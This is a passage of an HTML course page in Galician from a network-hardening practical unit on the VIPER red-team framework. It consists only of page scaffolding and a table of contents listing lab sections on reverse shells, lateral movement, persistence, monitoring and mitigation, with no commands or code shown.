
<!doctype html>
<html lang="gl" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../suricata/">
      
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.44">
    
    
      
        <title>VIPER - Bastionado de redes e sistemas - Prácticas Taller UD4 - Monitorización de redes e sistemas</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.0253249f.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../css/custom.css">
    
      <link rel="stylesheet" href="../../css/opera.css">
    
      <link rel="stylesheet" href="../../css/print.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#bastionado-e-simulacion-de-ataques-con-viper" class="md-skip">
          Ir ao contido
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Cabeceira">
    <a href="../.." title="Bastionado de redes e sistemas - Prácticas Taller UD4 - Monitorización de redes e sistemas" class="md-header__button md-logo" aria-label="Bastionado de redes e sistemas - Prácticas Taller UD4 - Monitorización de redes e sistemas" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Bastionado de redes e sistemas - Prácticas Taller UD4 - Monitorización de redes e sistemas
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              VIPER
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Procura" placeholder="Procura" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Procurar">
        
        <button type="reset" class="md-search__icon md-icon" title="Limpar" aria-label="Limpar" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Inicializando procura
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="Pestanas" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        
  
    
  
  De interese

      </a>
    </li>
  

      
        
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../clasificacion-ferramentas/" class="md-tabs__link">
          
  
  Prácticas Taller UD4

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Bastionado de redes e sistemas - Prácticas Taller UD4 - Monitorización de redes e sistemas" class="md-nav__button md-logo" aria-label="Bastionado de redes e sistemas - Prácticas Taller UD4 - Monitorización de redes e sistemas" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Bastionado de redes e sistemas - Prácticas Taller UD4 - Monitorización de redes e sistemas
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    De interese
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Prácticas Taller UD4
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Prácticas Taller UD4
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../clasificacion-ferramentas/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Clasificación ferramentas
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    NMS/ITIM
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            NMS/ITIM
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../nagios/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nagios
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    SIEM/IDS/IPS
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            SIEM/IDS/IPS
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../wazuh/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Wazuh
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    IDS/IPS
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            IDS/IPS
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../suricata/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Suricata
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" checked>
        
          
          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Bastionado e simulación de ataques (Red Team)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_5">
            <span class="md-nav__icon md-icon"></span>
            Bastionado e simulación de ataques (Red Team)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    VIPER
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    VIPER
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Táboa de contidos
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#escenario" class="md-nav__link">
    <span class="md-ellipsis">
      Escenario
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introducion" class="md-nav__link">
    <span class="md-ellipsis">
      Introdución
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#alcance-da-proba" class="md-nav__link">
    <span class="md-ellipsis">
      Alcance da Proba
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vm-1-atacante-viper" class="md-nav__link">
    <span class="md-ellipsis">
      VM-1 Atacante: VIPER
    </span>
  </a>
  
    <nav class="md-nav" aria-label="VM-1 Atacante: VIPER">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-requisitos-do-sistema" class="md-nav__link">
    <span class="md-ellipsis">
      1. Requisitos do Sistema
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-descarga-e-instalacion-de-viper" class="md-nav__link">
    <span class="md-ellipsis">
      2. Descarga e Instalación de VIPER
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-configuracion-do-dashboard-en-viper" class="md-nav__link">
    <span class="md-ellipsis">
      3. Configuración do Dashboard en VIPER
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exemplos-practicos" class="md-nav__link">
    <span class="md-ellipsis">
      Exemplos Prácticos
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exemplos Prácticos">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exemplo-1-reverse-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Exemplo 1: Reverse Shell
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exemplo 1: Reverse Shell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#escenario-resumido" class="md-nav__link">
    <span class="md-ellipsis">
      Escenario Resumido
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vm-1-atacante-viper_1" class="md-nav__link">
    <span class="md-ellipsis">
      VM-1 Atacante: VIPER
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vm-2-maquina-vitima" class="md-nav__link">
    <span class="md-ellipsis">
      VM-2 Máquina Vítima
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vm-1-atacante-viper_2" class="md-nav__link">
    <span class="md-ellipsis">
      VM-1 Atacante: VIPER
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vm-2-maquina-vitima_1" class="md-nav__link">
    <span class="md-ellipsis">
      VM-2 Máquina vítima
    </span>
  </a>
  
    <nav class="md-nav" aria-label="VM-2 Máquina vítima">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#monitorizacion-detectar-reverse-tcp-desde-debian-12" class="md-nav__link">
    <span class="md-ellipsis">
      Monitorización: Detectar Reverse TCP desde Debian 12
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bastionado-e-mitigacion" class="md-nav__link">
    <span class="md-ellipsis">
      Bastionado e Mitigación
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exemplo-2-movemento-lateral-expandir-acceso" class="md-nav__link">
    <span class="md-ellipsis">
      Exemplo 2: Movemento Lateral (Expandir Acceso)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exemplo 2: Movemento Lateral (Expandir Acceso)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#escenario-resumido_1" class="md-nav__link">
    <span class="md-ellipsis">
      Escenario Resumido
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Escenario Resumido">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#obxectivo-movemento-lateral-dende-vm-2-cara-vm-3" class="md-nav__link">
    <span class="md-ellipsis">
      Obxectivo: Movemento lateral dende VM-2 cara VM-3.
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-1-acceso-a-vm-2-payload-activo" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 1: Acceso á VM-2 (Payload activo)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Paso 1: Acceso á VM-2 (Payload activo)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#execucion-dende-vm-1-msfconsole-viper" class="md-nav__link">
    <span class="md-ellipsis">
      Execución dende VM-1 (msfconsole - VIPER)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#execucion-dende-vm-2-bash-linux" class="md-nav__link">
    <span class="md-ellipsis">
      Execución dende VM-2 (Bash - Linux)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-2-movemento-lateral-cara-vm-3" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 2: Movemento lateral cara VM-3
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Paso 2: Movemento lateral cara VM-3">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#escaneo-de-vm-3-dende-vm-2" class="md-nav__link">
    <span class="md-ellipsis">
      Escaneo de VM-3 dende VM-2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-3-movemento-lateral-con-psexec-smb" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 3: Movemento Lateral con Psexec (SMB)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Paso 3: Movemento Lateral con Psexec (SMB)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#execucion-dende-vm-1-msfconsole-viper_1" class="md-nav__link">
    <span class="md-ellipsis">
      Execución dende VM-1 (msfconsole - VIPER)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-4-verificar-acceso-a-vm-3" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 4: Verificar Acceso á VM-3
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Paso 4: Verificar Acceso á VM-3">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#execucion-dende-vm-1-msfconsole-viper_2" class="md-nav__link">
    <span class="md-ellipsis">
      Execución dende VM-1 (msfconsole - VIPER)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exemplo-3-persistencia" class="md-nav__link">
    <span class="md-ellipsis">
      Exemplo 3: Persistencia
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exemplo 3: Persistencia">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#persistencia-en-windows-con-metasploit-tras-acceso-con-psexec" class="md-nav__link">
    <span class="md-ellipsis">
      Persistencia en Windows con Metasploit tras acceso con psexec
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Persistencia en Windows con Metasploit tras acceso con psexec">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#paso-1-acceder-a-maquina-vitima-con-psexec" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 1: Acceder á máquina vítima con psexec
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-2-poner-a-sesion-meterpreter-en-background" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 2: Poñer a sesión meterpreter en background
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-3-iniciar-un-multihandler-para-recibir-a-persistencia" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 3: Iniciar un multi/handler para recibir a persistencia
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-4-xerar-o-payload-para-persistencia" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 4: Xerar o payload para persistencia
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-5-subir-o-payload-a-vm-3-e-crear-unha-tarefa-programada-na-vitimavm-3" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 5: Subir o payload a VM-3 e crear unha tarefa programada na vítima(VM-3)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#paso-6-probar-ou-agardar-reconexion" class="md-nav__link">
    <span class="md-ellipsis">
      Paso 6: Probar ou agardar reconexión
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#resumo" class="md-nav__link">
    <span class="md-ellipsis">
      Resumo
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#monitorizacion-do-movemento-lateral-desde-vm-2-a-vm-3" class="md-nav__link">
    <span class="md-ellipsis">
      Monitorización do Movemento Lateral desde VM-2 a VM-3
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bastionado-e-mitigacion-da-vm-3-windows-10" class="md-nav__link">
    <span class="md-ellipsis">
      Bastionado e mitigación da VM-3 (Windows 10)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Bastionado e mitigación da VM-3 (Windows 10)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#configuracion-de-firewall-para-bloquear-movemento-lateral" class="md-nav__link">
    <span class="md-ellipsis">
      Configuración de Firewall para bloquear movemento lateral
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#hardenizacion-de-servizos-windows" class="md-nav__link">
    <span class="md-ellipsis">
      Hardenización de Servizos Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#aplicar-politicas-de-seguridade-mediante-gpeditmsc" class="md-nav__link">
    <span class="md-ellipsis">
      Aplicar Políticas de Seguridade mediante gpedit.msc
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#monitoreo-continuo-con-auditpol" class="md-nav__link">
    <span class="md-ellipsis">
      Monitoreo Continuo con Auditpol
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    <span class="md-ellipsis">
      Conclusión
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Táboa de contidos
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#escenario" class="md-nav__link">
    <span class="md-ellipsis">
      Escenario
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introducion" class="md-nav__link">
    <span class="md-ellipsis">
      Introdución
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#alcance-da-proba" class="md-nav__link">
    <span class="md-ellipsis">
      Alcance da Proba
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#vm-1-atacante-viper" class="md-nav__link">
    <span class="md-ellipsis">
      VM-1 Atacante: VIPER
    </span>
  </a>
  
    <nav class="md-nav" aria-label="VM-1 Atacante: VIPER">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-requisitos-do-sistema" class="md-nav__link">
    <span class="md-ellipsis">
      1. Requisitos do Sistema
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-descarga-e-instalacion-de-viper" class="md-nav__link">
    <span class="md-ellipsis">
      2. Descarga e Instalación de VIPER
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-configuracion-do-dashboard-en-viper" class="md-nav__link">
    <span class="md-ellipsis">
      3. Configuración do Dashboard en VIPER
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exemplos-practicos" class="md-nav__link">
    <span class="md-ellipsis">
      Exemplos Prácticos
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exemplos Prácticos">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exemplo-1-reverse-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Exemplo 1: Reverse Shell
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exemplo 1: Reverse Shell">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#escenario-resumido" class="md-nav__link">
    <span class="md-ellipsis">
      Escenario Resumido
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vm-1-atacante-viper_1" class="md-nav__link">
    <span class="md-ellipsis">
      VM-1 Atacante: VIPER
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vm-2-maquina-vitima" class="md-nav__link">
    <span class="md-ellipsis">
      VM-2 Máquina Vítima
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vm-1-atacante-viper_2" class="md-nav__link">
    <span class="md-ellipsis">
      VM-1 Atacante: VIPER
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vm-2-maquina-vitima_1" class="md-nav__link">
    <span class="md-ellipsis">
      VM-2 Máquina vítima
    </span>
  </a>
  
    <nav class="md-nav" aria-label="VM-2 Máquina vítima">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#monitorizacion-detectar-reverse-tcp-desde-debian-12" class="md-nav__link">
    <span class="md-ellipsis">
      Monitorización: Detectar Reverse TCP desde Debian 12
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bastionado-e-mitigacion" class="md-nav__link">
    <span class="md-ellipsis">
      Bastionado e Mitigación
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exemplo-2-movemento-lateral-expandir-acceso" class="md-nav__link">
    <span class="md-ellipsis">
      Exemplo 2: Movemento Lateral (Expandir Acceso)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exemplo 2: Movemento Lateral (Expandir Acceso)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#escenario-resumido_1" class="md-nav__link">
    <span class="md-ellipsis">
      Escenario Resumido
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Escenario Resumido">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#obxectivo-movemento-lateral-dende-vm-2-cara-vm-3" class="md-nav__link">
    <span class="md-ellipsis">
